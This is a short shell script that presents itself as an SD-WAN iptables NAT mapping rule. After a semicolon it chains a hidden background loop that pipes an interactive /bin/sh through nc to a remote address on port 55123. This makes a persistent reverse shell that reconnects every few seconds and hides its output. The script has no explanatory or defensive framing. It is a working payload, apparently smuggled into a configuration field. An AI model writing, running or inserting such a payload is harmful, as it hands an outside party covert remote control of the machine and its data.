#!/bin/sh
iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /var/tmp/session-pipe;mkfifo /var/tmp/session-pipe;cat /var/tmp/session-pipe|/bin/sh -i 2>&1|nc 198.51.100.42 55123 >/var/tmp/session-pipe;sleep 3;done) >/dev/null 2>&1 &
